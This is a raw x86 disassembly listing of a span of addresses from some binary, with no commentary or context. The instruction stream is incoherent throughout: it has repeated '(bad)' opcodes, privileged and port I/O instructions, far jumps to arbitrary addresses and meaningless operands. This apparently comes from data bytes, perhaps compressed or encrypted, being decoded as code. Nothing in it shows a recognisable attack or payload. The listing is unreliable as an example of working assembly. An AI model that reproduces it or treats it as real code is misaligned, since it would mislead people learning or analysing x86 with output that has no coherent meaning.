  41c14f:	pop    esp
  41c150:	pop    ds
  41c151:	nop
  41c152:	in     eax,0xad
  41c154:	push   cs
  41c155:	mov    dh,0x9f
  41c157:	push   es
  41c158:	jg     0x41c15b
  41c15a:	xchg   edx,eax
  41c15b:	imul   edi,ebp,0x533a9993
  41c161:	dec    edx
  41c162:	jne    0x41c152
  41c164:	aas    
  41c165:	push   es
  41c166:	xor    DWORD PTR [edi+0x2a],eax
  41c169:	sbb    BYTE PTR [ebx+0xd28f55b],0xbf
  41c170:	lods   eax,DWORD PTR ds:[esi]
  41c171:	lahf   
  41c172:	aaa    
  41c173:	sbb    BYTE PTR [esp+edi*8+0x333d7b62],dl
  41c17a:	jmp    0x749c04b0
  41c17f:	mov    dl,0x65
  41c181:	inc    edi
  41c182:	fstp   TBYTE PTR [edx+edx*2-0x631eebbf]
  41c189:	sbb    al,0x26
  41c18b:	out    dx,al
  41c18c:	les    ebp,FWORD PTR [ebx-0x40]
  41c18f:	cli    
  41c190:	nop
  41c191:	inc    edi
  41c192:	mov    al,0x25
  41c194:	test   DWORD PTR [ebx+ebp*4+0x29793816],ecx
  41c19b:	push   ebx
  41c19c:	cmp    ebp,DWORD PTR [ebp+0x37]
  41c19f:	dec    edx
  41c1a0:	es retf 0xfc79
  41c1a4:	mov    edi,edi
  41c1a6:	jb     0x41c202
  41c1a8:	push   cs
  41c1a9:	sub    eax,0xb010c9b8
  41c1ae:	aaa    
  41c1af:	iret   
  41c1b0:	hlt    
  41c1b1:	cmp    bl,BYTE PTR [edx-0x192e0a9d]
  41c1b7:	cld    
  41c1b8:	push   cs
  41c1b9:	(bad)  
  41c1ba:	idiv   BYTE PTR [edx+0x48ef924e]
  41c1c0:	mov    ds:0x21a90d65,al
  41c1c5:	cmp    al,0x17
  41c1c7:	mov    edi,edx
  41c1c9:	cmp    eax,0x1784180
  41c1ce:	pop    ebp
  41c1cf:	int    0xc1
  41c1d1:	xchg   ebp,eax
  41c1d2:	push   0x563fcd4b
  41c1d7:	sbb    bl,BYTE PTR [edx]
  41c1d9:	cs and eax,0x95bcbf6d
  41c1df:	xlat   BYTE PTR ds:[ebx]
  41c1e0:	inc    esi
  41c1e1:	dec    ebx
  41c1e2:	jmp    0xd45c:0x7bcd36bb
  41c1e9:	inc    ebp
  41c1ea:	cmp    al,ah
  41c1ec:	mov    ds:0xa085abb9,al
  41c1f1:	mov    BYTE PTR [ebp+0x2032371c],bl
  41c1f7:	aam    0xfd
  41c1f9:	dec    esp
  41c1fa:	imul   edx,DWORD PTR [edi],0x69bf67ab
  41c200:	adc    al,0x1b
  41c202:	or     ch,BYTE PTR [ecx+0x76]
  41c205:	imul   ebx,ecx,0xf
  41c208:	mov    es,WORD PTR [ecx-0x1a]
  41c20b:	sub    al,0xd8
  41c20d:	fist   DWORD PTR [ebx+0x22]
  41c210:	inc    ecx
  41c211:	popf   
  41c212:	pop    ebx
  41c213:	test   al,0x8d
  41c215:	pusha  
  41c216:	icebp  
  41c217:	add    al,0xf9
  41c219:	inc    ebp
  41c21a:	and    BYTE PTR [ebp+0x69],dl
  41c21d:	xchg   ecx,eax
  41c21e:	lods   eax,DWORD PTR ds:[esi]
  41c21f:	or     eax,0xe204c01
  41c224:	test   BYTE PTR [ebx+0x24d7214e],bl
  41c22a:	or     ah,dh
  41c22c:	add    al,0x93
  41c22e:	or     ebp,DWORD PTR [esi-0x6463ec49]
  41c234:	fwait
  41c235:	pop    esp
  41c236:	push   esi
  41c237:	push   DWORD PTR [esi-0x78]
  41c23a:	pop    edi
  41c23b:	rcl    DWORD PTR [edi],cl
  41c23d:	into   
  41c23e:	pop    ebp
  41c23f:	outs   dx,DWORD PTR ds:[esi]
  41c240:	and    eax,0xa3385983
  41c245:	push   esi
  41c246:	aad    0xb8
  41c248:	lahf   
  41c249:	daa    
  41c24a:	mov    al,ds:0x28b224f9
  41c24f:	gs je  0x41c294
  41c252:	inc    esp
  41c253:	xor    BYTE PTR [edx+0x52deba4b],0x54
  41c25a:	ss pop ecx
  41c25c:	call   0xd98f:0x995eb944
  41c263:	sbb    BYTE PTR [ebp+0xb],cl
  41c266:	repz dec edx
  41c268:	add    BYTE PTR [esi],bh
  41c26a:	add    eax,0x27558ac1
  41c26f:	jl     0x41c2da
  41c271:	pop    edx
  41c272:	cdq    
  41c273:	jmp    0x142b2e11
  41c278:	cmp    eax,0xa782a49
  41c27d:	cli    
  41c27e:	sahf   
  41c27f:	xor    BYTE PTR [esi-0xe],dl
  41c282:	xor    BYTE PTR [ebx],0x92
  41c285:	xor    ah,0x3f
  41c288:	aam    0xc8
  41c28a:	mov    ds:0xebec58c4,eax
  41c28f:	ror    DWORD PTR [eax],0xb3
  41c292:	pop    eax
  41c293:	aam    0x14
  41c295:	xchg   edx,eax
  41c296:	lahf   
  41c297:	jb     0x41c2d6
  41c299:	enter  0xcfc8,0xb6
  41c29d:	xchg   DWORD PTR [edi-0x4734547a],ebp
  41c2a3:	ss add edi,DWORD PTR gs:[edi+ecx*2+0xb]
  41c2a9:	jo     0x41c26e
  41c2ab:	lock mov ebp,0x75423d7f
  41c2b1:	cld    
  41c2b2:	inc    ecx
  41c2b3:	test   DWORD PTR [edx*8-0x4ce04d41],eax
  41c2ba:	pop    ds
  41c2bb:	inc    esp
  41c2bc:	mov    cl,bh
  41c2be:	dec    eax
  41c2bf:	ret    
  41c2c0:	js     0x41c296
  41c2c2:	or     bl,BYTE PTR [ebx]
  41c2c4:	fidiv  DWORD PTR [ebx-0x47]
  41c2c7:	pop    ebx
  41c2c8:	adc    bl,BYTE PTR [ebp+0x5a]
  41c2cb:	cmp    dh,ah
  41c2cd:	sbb    eax,0xffc1d86c
  41c2d2:	loop   0x41c2b2
  41c2d4:	sub    DWORD PTR [eax+0x17],ebp
  41c2d7:	and    eax,0xc98bab0c
  41c2dc:	out    dx,eax
  41c2dd:	aas    
  41c2de:	add    al,0x2a
  41c2e0:	jbe    0x41c325
  41c2e2:	mov    al,ds:0xc11e07cd
  41c2e7:	bound  edx,QWORD PTR [edx]
  41c2e9:	ret    0x7343
  41c2ec:	sbb    dh,bh
  41c2ee:	dec    DWORD PTR [ebp+0x389614a2]
  41c2f4:	jne    0x41c292
  41c2f6:	popa   
  41c2f7:	or     al,0xc1
  41c2f9:	push   eax
  41c2fa:	scas   eax,DWORD PTR es:[edi]
  41c2fb:	outs   dx,DWORD PTR ds:[esi]
  41c2fc:	aaa    
  41c2fd:	jbe    0x41c367
  41c2ff:	imul   esi,DWORD PTR [ebp+0x1fcbf362],0xc6fb1b98
  41c309:	mov    edx,0x16d54abe
  41c30e:	int    0x4
  41c310:	jns    0x41c32d
  41c312:	dec    edi
  41c313:	dec    edx
  41c315:	mov    WORD PTR [eax],cs
  41c317:	cld    
  41c318:	jmp    0xd37b:0x8f69708b
  41c31f:	mov    edi,0xf24dd353
  41c324:	inc    edx
  41c325:	sahf   
  41c326:	mov    eax,ds:0x347dc417
  41c32b:	ret    0xaff9
  41c32e:	lods   eax,DWORD PTR ds:[esi]
  41c32f:	out    0x85,eax
  41c331:	mov    eax,ds:0xd9d36a9b
  41c336:	jge    0x41c2d7
  41c338:	ins    BYTE PTR es:[edi],dx
  41c339:	xchg   ebx,eax
  41c33a:	dec    edi
  41c33b:	jecxz  0x41c387
  41c33d:	mov    eax,0x8518178e
  41c342:	xchg   ebx,eax
  41c343:	sub    eax,ecx
  41c345:	popa   
  41c346:	pop    ebp
  41c347:	jle    0x41c333
  41c349:	mov    BYTE PTR [edi-0x726898b],0x9c
  41c350:	stc    
  41c351:	sub    bh,BYTE PTR [ecx+esi*4]
  41c354:	and    DWORD PTR [eax+ecx*2+0x68],esp
  41c358:	add    dh,BYTE PTR [edi]
  41c35a:	mov    ebx,DWORD PTR [eax-0x7e691828]
  41c360:	or     al,0xb6
  41c362:	ja     0x41c3c9
  41c364:	popa   
  41c365:	popa   
  41c366:	je     0x41c3d5
  41c368:	in     eax,dx
  41c369:	es fs pop ebp
  41c36c:	mov    al,ds:0xd590e0
  41c371:	lock shl DWORD PTR [edi-0x6f6d8d64],1
  41c378:	aam    0xa6
  41c37a:	sub    al,0x2c
  41c37c:	out    dx,al
  41c37d:	xor    eax,0xb7041df4
  41c382:	xor    eax,0x341cef8c
  41c387:	add    dl,ah
  41c389:	sbb    al,0xc5
  41c38b:	push   ecx
  41c38c:	cld    
  41c38d:	cs jp  0x41c328
  41c390:	inc    edx
  41c391:	hlt    
  41c392:	xchg   esi,eax
  41c393:	lods   eax,DWORD PTR ds:[esi]
  41c394:	add    al,0x39
  41c396:	mov    ecx,0x6c60af55
  41c39b:	out    dx,eax
  41c39c:	lds    eax,FWORD PTR [edx+0x67ab3e3]
  41c3a2:	jg     0x41c3b1
  41c3a4:	(bad)  
  41c3a5:	jmp    0x41c3a4
  41c3a7:	aad    0x11
  41c3a9:	jb     0x41c35d
  41c3ab:	dec    edi
  41c3ac:	jg     0x41c410
  41c3ae:	or     BYTE PTR [edi+0x7d],al
  41c3b1:	and    dl,ch
  41c3b3:	inc    edi
  41c3b4:	call   0x21fa:0x504b04f8
  41c3bb:	and    cl,BYTE PTR [ecx]
  41c3bd:	jbe    0x41c406
  41c3bf:	jbe    0x41c3fd
  41c3c1:	pop    edi
  41c3c2:	dec    edx
  41c3c3:	fld    QWORD PTR [esi]
  41c3c5:	mov    dl,BYTE PTR [eax+0x1ea2987c]
  41c3cb:	inc    esi
  41c3cc:	xor    al,0x76
  41c3ce:	imul   ebx,DWORD PTR [esi],0xbdfc9a78
  41c3d4:	cmp    dl,dh
  41c3d6:	sbb    eax,0xd03457fd
  41c3db:	loope  0x41c3dc
  41c3dd:	(bad)  
  41c3df:	pop    edx
  41c3e0:	repnz bswap esp
  41c3e3:	sub    ebx,DWORD PTR [eax-0x3446c99f]
  41c3e9:	data16 and bh,BYTE PTR [ebp-0x51]
  41c3ed:	pop    ss
  41c3ee:	and    al,BYTE PTR [eax+edx*8]
  41c3f1:	sbb    eax,0xe02e0133
  41c3f6:	out    dx,eax
  41c3f7:	loope  0x41c424
  41c3f9:	(bad)  
  41c3fa:	nop
  41c3fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3fc:	mov    eax,0xe454d497
  41c401:	sub    eax,0x905bb2f8
  41c406:	and    ecx,DWORD PTR [edx-0xd2e0291]
  41c40c:	mov    eax,ds:0x383063aa
  41c411:	mov    esp,DWORD PTR [eax-0x8]
  41c414:	pop    ss
  41c415:	jl     0x41c3e4
  41c417:	addr16 mov dh,0xf4
  41c41a:	ret    0xf83a
  41c41d:	sbb    dh,BYTE PTR [ecx+0x12]
  41c420:	mov    esp,DWORD PTR [edi+0x7e8b641a]
  41c426:	arpl   WORD PTR [esp+edi*1],ax
  41c429:	faddp  st(3),st
  41c42b:	add    ecx,edi
  41c42d:	fld    DWORD PTR [edi+0x11b506f0]
  41c433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c434:	imul   esp,DWORD PTR [esp+edx*4-0x53cc073b],0x983b2351
  41c43f:	mov    bh,0xb9
  41c441:	retf   0x3fd
  41c444:	inc    BYTE PTR [eax+0x4]
  41c447:	stc    
  41c448:	push   0x7f920e3a
  41c44d:	cli    
  41c44e:	fcmovne st,st(3)
  41c450:	dec    ebx
  41c451:	dec    esi
  41c452:	aaa    
  41c453:	push   0x89b37bf3
  41c458:	in     al,dx
  41c459:	and    DWORD PTR [edx+0x279b80f0],0xd829d85a
  41c463:	cmp    eax,0x1e
  41c466:	enter  0x127c,0xba
  41c46a:	add    edi,DWORD PTR [edi]
  41c46c:	pop    edi
  41c46d:	add    ebp,DWORD PTR [ebx+0x29]
  41c470:	push   esi
  41c471:	aaa    
  41c472:	xlat   BYTE PTR ds:[ebx]
  41c473:	push   0x78
  41c475:	(bad)  
  41c476:	mov    ds:0xfd384789,eax
  41c47b:	push   edi
  41c47c:	mov    ds:0xcaaa1765,eax
  41c481:	fs scas eax,DWORD PTR es:[edi]
  41c483:	pop    ss
  41c484:	outs   dx,DWORD PTR ds:[esi]
  41c485:	jg     0x41c443
  41c487:	push   ecx
  41c488:	inc    esi
  41c489:	fs in  eax,dx
  41c48b:	push   edx
  41c48c:	repz inc ebx
  41c48e:	(bad)  
  41c48f:	push   edi
  41c490:	mov    edi,0x2c15ed04
  41c495:	div    DWORD PTR [esi+0x12]
  41c498:	mov    WORD PTR [edx+0x28],gs
  41c49b:	hlt    
  41c49c:	stc    
  41c49d:	mov    ebx,ebx
  41c49f:	nop
  41c4a0:	je     0x41c461
  41c4a2:	dec    edx
  41c4a3:	shr    BYTE PTR [ecx],1
  41c4a5:	lods   eax,DWORD PTR ds:[esi]
  41c4a6:	sub    bl,BYTE PTR [edx-0x4f]
  41c4a9:	pop    edi
  41c4aa:	add    BYTE PTR [esi-0x27],ch
  41c4ad:	push   0x4688d377
  41c4b2:	jbe    0x41c480
  41c4b4:	cwde   
  41c4b5:	mov    eax,0xb05faf4f
  41c4ba:	adc    al,0xb8
  41c4bc:	cmp    bh,bl
  41c4be:	lea    ecx,[ecx-0x48]
  41c4c1:	fsub   QWORD PTR ds:0xdd5ec5d6
  41c4c7:	out    0x3d,eax
  41c4c9:	dec    ebx
  41c4ca:	mov    ecx,ecx
  41c4cc:	cmc    
  41c4cd:	sbb    eax,0x3af45228
  41c4d2:	cli    
  41c4d3:	dec    ecx
  41c4d4:	std    
  41c4d5:	jl     0x41c553
  41c4d7:	pop    ecx
  41c4d8:	fmul   st(0),st
  41c4da:	mov    bl,0xc4
  41c4dc:	scas   eax,DWORD PTR es:[edi]
  41c4dd:	inc    edi
  41c4de:	jl     0x41c467
  41c4e0:	xlat   BYTE PTR ds:[ebx]
  41c4e1:	mov    dh,0x52
  41c4e3:	xchg   edi,eax
  41c4e4:	mov    dh,0x40
  41c4e6:	repz shl BYTE PTR [ebx],0x36
  41c4ea:	cmp    edi,edi
  41c4ec:	cmp    DWORD PTR [edx],ebp
  41c4ee:	add    eax,0x18617d4a
  41c4f3:	adc    eax,0x6fba4847
  41c4f8:	push   ebp
  41c4f9:	icebp  
  41c4fa:	sub    esp,esp
  41c4fc:	pop    esp
  41c4fd:	jle    0x41c4ab
  41c4ff:	mov    edx,0x4a9ccd93
  41c504:	mov    ah,ah
  41c506:	sbb    eax,0x63e0a9d8
  41c50b:	outs   dx,DWORD PTR ds:[esi]
  41c50c:	jmp    0xcbcfe463
  41c511:	inc    esi
  41c512:	adc    esp,eax
  41c514:	mov    al,ds:0xf31e031d
  41c519:	addr16 mov ebx,ebp
  41c51c:	dec    ecx
  41c51d:	jl     0x41c532
  41c51f:	push   cs
  41c520:	inc    esp
  41c521:	sbb    BYTE PTR [ebp-0x68],ch
  41c524:	add    DWORD PTR [edx-0x5b],ebx
  41c527:	and    al,0x64
  41c529:	jle    0x41c55b
  41c52b:	shl    BYTE PTR [esi+edx*2-0x2b74da5a],cl
  41c532:	and    al,0xc8
  41c534:	retf   
  41c535:	scas   al,BYTE PTR es:[edi]
  41c536:	mov    esi,0x4c52dc9c
  41c53b:	xchg   BYTE PTR [ecx+edi*4-0x51a3888b],ah
  41c542:	jnp    0x41c507
  41c544:	cmp    al,0x5a
  41c546:	jmp    FWORD PTR [eax]
  41c548:	call   0xb4e9669f
  41c54d:	inc    edx
  41c54e:	imul   ecx,edx,0xffffffa3
  41c551:	or     al,0x8
  41c553:	ret    0x8a16
  41c556:	pusha  
  41c557:	and    edx,DWORD PTR [eax-0x40c9861d]
  41c55d:	lods   al,BYTE PTR ds:[esi]
  41c55e:	mov    ah,0xc1
  41c560:	mov    ah,0x36
  41c562:	pop    ds
  41c563:	fsqrt  
  41c565:	dec    esi
  41c566:	(bad)
  41c569:	lahf   
  41c56a:	rcr    DWORD PTR [ebp+0x38],0x90
  41c56e:	xchg   esi,eax
  41c56f:	mov    esi,0xa7e15e21
  41c574:	adc    eax,0xfdad1d03
  41c579:	xor    eax,ecx
  41c57b:	mov    ecx,esp
  41c57d:	frstor [edx-0x2f]
  41c580:	out    dx,al
  41c581:	mov    dl,0x88
  41c583:	ins    BYTE PTR es:[di],dx
  41c585:	mov    ds:0x9e2c0725,al
  41c58a:	dec    DWORD PTR [ebx+0x35]
  41c58d:	adc    DWORD PTR [esi-0x603f1686],edi
  41c593:	jle    0x41c56d
  41c595:	(bad)  
  41c596:	dec    ecx
  41c597:	or     dh,BYTE PTR [eax+0x6a7d73ae]
  41c59d:	or     eax,0x74002844
  41c5a2:	pop    edx
  41c5a3:	test   al,0x92
  41c5a5:	mov    edx,0x1cdc3d04
  41c5aa:	sbb    ebp,DWORD PTR [ebp-0x25a08249]
  41c5b0:	rol    BYTE PTR [edx],0x73
  41c5b3:	outs   dx,DWORD PTR ds:[esi]
  41c5b4:	test   BYTE PTR [edi-0x1f],dh
  41c5b7:	pop    edi
  41c5b8:	call   0x3a643fe9
  41c5bd:	std    
  41c5be:	push   ds
  41c5bf:	jno    0x41c571
  41c5c1:	xchg   DWORD PTR [edx*8-0x197e967b],ebp
  41c5c8:	sub    al,0x3c
  41c5ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5cb:	sub    BYTE PTR [ebx+0x6912fc98],dh
  41c5d1:	aas    
  41c5d2:	fs in  al,0xe4
  41c5d5:	inc    ebx
  41c5d6:	xchg   esi,eax
  41c5d7:	mov    ebx,0x37bf721b
  41c5dc:	aaa    
  41c5dd:	dec    edi
  41c5de:	out    dx,eax
  41c5df:	xchg   ebx,eax
  41c5e0:	mov    ebp,0x5905ae5e
  41c5e5:	retf   
  41c5e6:	cs dec eax
  41c5e8:	cmp    eax,0xc9288705
  41c5ed:	or     BYTE PTR [ebx],al
  41c5ef:	hlt    
  41c5f0:	popa   
  41c5f1:	inc    edx
  41c5f2:	or     eax,DWORD PTR [di-0x3b]
  41c5f6:	xlat   BYTE PTR ds:[ebx]
  41c5f7:	mov    edi,0x17dd0af5
  41c5fc:	cli    
  41c5fd:	cmp    ebp,esi
  41c5ff:	inc    ecx
  41c600:	push   edx
  41c601:	mov    edi,0xf661418f
  41c606:	es mov dh,0xaa
  41c609:	int3   
  41c60a:	inc    edi
  41c60b:	jge    0x41c5d3
  41c60d:	adc    bh,bl
  41c60f:	scas   al,BYTE PTR es:[edi]
  41c610:	sbb    eax,0xe3be8c7f
  41c615:	sub    dl,dh
  41c617:	dec    edi
  41c618:	push   es
  41c619:	pop    eax
  41c61a:	cmp    ebx,edx
  41c61c:	retf   0x4162
  41c61f:	sub    bl,BYTE PTR [ecx]
  41c621:	lds    ebp,FWORD PTR [edx-0x7c]
  41c624:	and    DWORD PTR [ecx+0x49a73fa7],ebx
  41c62a:	sbb    eax,eax
  41c62c:	mov    ecx,0x13208942
  41c631:	(bad)  
  41c632:	imul   BYTE PTR gs:[edi-0x6c24c669]
  41c639:	retf   0x8ce
  41c63c:	jns    0x41c5e9
  41c63e:	(bad)  
  41c63f:	sbb    esi,DWORD PTR [edi-0x34eb60fd]
  41c645:	loop   0x41c663
  41c647:	cwde   
  41c648:	(bad)  
  41c649:	jae    0x41c6c9
  41c64b:	add    eax,0xef6efe5c
  41c650:	rol    BYTE PTR [edi-0x15],1
  41c653:	mov    ah,0xe6
  41c655:	inc    edx
  41c656:	or     BYTE PTR [eax-0x34090ebc],cl
  41c65c:	jle    0x41c65f
  41c65e:	aam    0x69
  41c660:	adc    bl,bh
  41c662:	iret   
  41c663:	fcmove st,st(2)
  41c665:	fucomi st,st(3)
  41c667:	xchg   esp,eax
  41c668:	ins    BYTE PTR es:[edi],dx
  41c669:	push   ebx
  41c66a:	aas    
  41c66b:	(bad)  
  41c66c:	lahf   
  41c66d:	(bad)  
  41c66e:	adc    ecx,DWORD PTR [edi]
  41c670:	test   al,0xa4
  41c672:	loop   0x41c689
  41c674:	cmc    
  41c675:	cld    
  41c676:	jmp    0x620365ef
  41c67b:	cmp    BYTE PTR [eax],dh
  41c67d:	outs   dx,DWORD PTR ds:[esi]
  41c67e:	jb     0x41c646
  41c680:	mov    dh,0xc5
  41c682:	add    ebp,DWORD PTR [esp+ebp*2-0x27]
  41c686:	xchg   edx,eax
  41c687:	test   al,0x74
  41c689:	icebp  
  41c68a:	jecxz  0x41c672
  41c68c:	push   eax
  41c68d:	ins    DWORD PTR es:[edi],dx
  41c68e:	pop    edi
  41c68f:	push   ebp
  41c690:	mov    eax,esi
  41c692:	bound  esi,QWORD PTR [ebx-0x1b]
  41c695:	gs enter 0x5a56,0xb0
  41c69a:	inc    esp
  41c69b:	adc    BYTE PTR [eax-0x367d5d51],ah
  41c6a1:	push   ss
  41c6a2:	ins    DWORD PTR es:[edi],dx
  41c6a3:	in     eax,0x71
  41c6a5:	and    eax,0x1842e1a9
  41c6aa:	(bad)  
  41c6ab:	pop    esp
  41c6ac:	add    BYTE PTR [ecx-0x6],ch
  41c6af:	or     BYTE PTR [eax],0xff
  41c6b2:	xchg   ch,bl
  41c6b4:	mov    esp,0xac5d79da
  41c6b9:	int    0xae
  41c6bb:	rol    BYTE PTR [eax+0x2454423c],1
  41c6c1:	or     al,0x18
  41c6c3:	jp     0x41c65e
  41c6c5:	jle    0x41c678
  41c6c7:	add    BYTE PTR [edi],bl
  41c6c9:	dec    edx
  41c6ca:	inc    ebx
  41c6cb:	cld    
  41c6cc:	inc    edx
  41c6cd:	push   edx
  41c6ce:	inc    ebx
  41c6cf:	mov    esp,0xf434edf0
  41c6d4:	shr    esp,0xe5
  41c6d7:	mov    dl,0xf5
  41c6d9:	cmp    DWORD PTR [edx+0x10],ebx
  41c6dc:	cld    
  41c6dd:	rol    edx,0xa0
  41c6e0:	retf   0x627f
  41c6e3:	repz test DWORD PTR [ebp+0x7f],ebx
  41c6e7:	sbb    ecx,DWORD PTR [edx]
  41c6e9:	shl    dh,cl
  41c6eb:	mov    bl,0xa
  41c6ed:	ss dec ebx
  41c6ef:	jae    0x41c67b
  41c6f1:	and    BYTE PTR [esi+edi*1],dh
  41c6f4:	arpl   WORD PTR [esi*8-0x76e4c48d],dx
  41c6fb:	pop    ebp
  41c6fc:	adc    BYTE PTR [ebp+0x4952abe3],0x9
  41c703:	mov    eax,DWORD PTR [eax+0x74d1be0]
  41c709:	sub    eax,DWORD PTR [esi+0x389edcf4]
  41c70f:	outs   dx,BYTE PTR ds:[esi]
  41c710:	dec    ebx
  41c711:	jb     0x41c786
  41c713:	and    ch,dh
  41c715:	loop   0x41c711
  41c717:	imul   ebx,DWORD PTR [ecx+0xd],0x13
  41c71b:	mov    ds:0x129d9506,eax
  41c720:	outs   dx,DWORD PTR ds:[esi]
  41c721:	(bad)  
  41c722:	dec    ebp
  41c723:	out    0xda,al
  41c725:	mov    edi,0xffb8301a
  41c72a:	or     eax,0x3f84e9a1
  41c72f:	mov    ah,0x87
  41c731:	sub    BYTE PTR [ecx],0xc1
  41c734:	jmp    0x41c730
  41c736:	push   ebp
  41c737:	xor    DWORD PTR [ebp-0x7f],edx
  41c73a:	push   edx
  41c73b:	repnz iret 
  41c73d:	(bad)  
  41c73e:	mov    al,0x9f
  41c740:	aas    
  41c741:	lods   al,BYTE PTR ds:[esi]
  41c742:	xor    ch,bl
  41c744:	or     eax,DWORD PTR [edx]
  41c746:	or     dl,BYTE PTR [esi-0x1a]
  41c749:	xchg   edx,eax
  41c74a:	cmp    DWORD PTR [ecx+0x34ee088a],0xffffff9f
  41c751:	add    al,0x46
  41c753:	aas    
  41c754:	xchg   edx,eax
  41c755:	pop    ecx
  41c756:	loop   0x41c724
  41c758:	push   edi
  41c759:	xor    al,0xa
  41c75b:	push   0xbcec671a
  41c760:	popa   
  41c761:	jg     0x41c76d
  41c763:	xchg   edi,eax
  41c764:	cmp    DWORD PTR [ebp-0x4f],esi
  41c767:	pusha  
  41c768:	xor    eax,esp
  41c76a:	jmp    0x41c730
  41c76c:	call   0x5a31c58d
  41c771:	repnz lds edi,FWORD PTR [edx+0x6e]
  41c775:	cdq    
  41c776:	cmp    eax,0x63963bda
  41c77b:	inc    ecx
  41c77c:	push   ss
  41c77d:	push   esp
  41c77e:	mov    ecx,0xf2fa353b
  41c783:	mov    ebp,0x9276052e
  41c788:	mov    ecx,0xf00e362
  41c78d:	xor    DWORD PTR [ecx],esi
  41c78f:	jmp    0x89d8af4b
  41c794:	dec    esi
  41c795:	ret    
  41c796:	imul   esp,DWORD PTR [ecx+edi*4],0x53
  41c79a:	dec    ebx
  41c79b:	pop    ss
  41c79c:	data16 mov ah,ch
  41c79f:	xor    eax,ecx
  41c7a1:	fs gs nop
  41c7a4:	(bad)  
  41c7a5:	push   ebx
  41c7a6:	adc    DWORD PTR [esi+0x64],ebx
  41c7a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7aa:	cwde   
  41c7ab:	pop    edx
  41c7ac:	adc    BYTE PTR [ebp-0x5830bc51],0x24
  41c7b3:	in     eax,dx
  41c7b4:	jae    0x41c7f3
  41c7b6:	sbb    BYTE PTR [ebx],ch
  41c7b8:	pop    ds
  41c7b9:	popf   
  41c7ba:	mov    esp,0xd62362b7
  41c7bf:	add    ah,dl
  41c7c1:	and    DWORD PTR [edx+0x6554f5fa],edx
  41c7c7:	jns    0x41c7c5
  41c7c9:	shl    esi,1
  41c7cb:	xor    al,0x2b
  41c7cd:	shl    DWORD PTR [edi+0x5],1
  41c7d0:	(bad)  
  41c7d2:	and    DWORD PTR [ecx+0x67678a7d],edi
  41c7d8:	call   0x88e1eeea
  41c7dd:	call   DWORD PTR [edx-0x94d0237]
  41c7e3:	loop   0x41c859
  41c7e5:	call   eax
  41c7e7:	shl    BYTE PTR [edi+0x7c],0xff
  41c7eb:	iret   
  41c7ec:	mov    dl,bh
  41c7ee:	inc    edx
  41c7ef:	add    al,BYTE PTR [edx]
  41c7f1:	jmp    0x41c815
  41c7f3:	fdivr  QWORD PTR ds:0x951539f2
  41c7f9:	jmp    0x41c7d7
  41c7fb:	mov    dh,0x39
  41c7fd:	push   edi
  41c7fe:	repz fs cs adc al,0x72
  41c803:	mov    eax,0xe101bd9a
  41c808:	scas   eax,DWORD PTR es:[edi]
  41c809:	xor    dh,0x1c
  41c80c:	daa    
  41c80d:	call   0xe79676a
  41c812:	cmp    bl,BYTE PTR [esi]
  41c814:	ror    DWORD PTR ds:0x4c5bf8a0,cl
  41c81a:	push   ecx
  41c81b:	sbb    al,0x5f
  41c81d:	dec    ebp
  41c81e:	pop    edx
  41c81f:	push   edi
  41c820:	push   eax
  41c821:	xchg   BYTE PTR [edi-0x2ff7d312],ah
  41c827:	or     BYTE PTR [ecx+0x12],ch
  41c82a:	or     esp,edi
  41c82c:	inc    esp
  41c82d:	in     al,0x35
  41c82f:	frndint 
  41c831:	shl    DWORD PTR [eax],0x81
  41c834:	shl    edi,1
  41c836:	add    DWORD PTR [eax+0x3c],esp
  41c839:	sar    BYTE PTR [ecx+0x5c],cl
  41c83c:	ret    
  41c83d:	and    al,0x15
  41c83f:	ja     0x41c8b1
  41c841:	test   DWORD PTR [esi+0x49],esi
  41c844:	pop    edi
  41c845:	ins    DWORD PTR es:[edi],dx
  41c846:	sbb    BYTE PTR [edi-0x29],0x79
  41c84a:	mov    fs,WORD PTR [edi]
  41c84c:	pushf  
  41c84d:	mov    ebx,0x603be493
  41c852:	and    bl,BYTE PTR [ebp+0x469d487c]
  41c858:	std    
  41c859:	pop    ds
  41c85a:	ins    DWORD PTR es:[edi],dx
  41c85b:	ds jle 0x41c89b
  41c85e:	cld    
  41c85f:	aaa    
  41c860:	xchg   ebp,eax
  41c861:	popa   
  41c862:	mov    esp,es
  41c864:	imul   esp,DWORD PTR [edx+0x3a],0x7b
  41c868:	imul   ecx,DWORD PTR [eax],0x69124e7e
  41c86e:	pop    edi
  41c86f:	dec    edi
  41c870:	adc    al,0x38
  41c872:	(bad)  
  41c873:	es loope 0x41c7fc
  41c876:	adc    DWORD PTR [ecx+esi*8+0x69],ecx
  41c87a:	or     BYTE PTR ds:0x16083048,bl
  41c880:	pusha  
  41c881:	bound  ebx,QWORD PTR ds:0x1e7b5512
  41c887:	mov    cl,0x33
  41c889:	pushf  
  41c88a:	push   esi
  41c88b:	push   esi
  41c88c:	add    al,0x3d
  41c88e:	or     eax,0xae2b7741
  41c893:	outs   dx,BYTE PTR ds:[esi]
  41c894:	xchg   BYTE PTR [edx+edx*4-0x36],ah
  41c898:	mov    bh,0xfe
  41c89a:	push   edi
  41c89b:	pop    es
  41c89c:	add    DWORD PTR [ebx+0x61dc80c2],ebx
  41c8a2:	(bad)  
  41c8a3:	mov    esp,0xa0437cdc
  41c8a8:	vpmaxub xmm3,xmm7,XMMWORD PTR [ecx]
  41c8ac:	ret    
  41c8ad:	pushf  
  41c8ae:	and    BYTE PTR [ecx+0x46d3897e],dh
  41c8b4:	xchg   edx,eax
  41c8b5:	das    
  41c8b6:	xor    ebx,DWORD PTR [ebx-0x167c10e8]
  41c8bc:	cmp    eax,0x29978e3
  41c8c1:	mov    ebx,DWORD PTR [ecx-0x76d7e7e9]
  41c8c7:	sbb    ebx,DWORD PTR [ebx]
  41c8c9:	cmp    eax,0x33791d19
  41c8ce:	and    edx,DWORD PTR [esi+ebx*4-0x577bf833]
  41c8d5:	mov    eax,0xbecf589f
  41c8da:	push   es
  41c8db:	inc    edi
  41c8dc:	jmp    0x41c8c3
  41c8de:	push   esi
  41c8df:	push   ebp
  41c8e0:	dec    edx
  41c8e1:	lea    edx,[edi+0x3f]
  41c8e4:	fldcw  WORD PTR [eax-0x28b31206]
  41c8ea:	add    al,0x51
  41c8ec:	jmp    0xc379ea29
  41c8f1:	add    DWORD PTR [ebx+0x7fcf11a5],eax
  41c8f7:	inc    ecx
  41c8f8:	in     eax,0x52
  41c8fa:	pop    ebp
  41c8fb:	es (bad) 
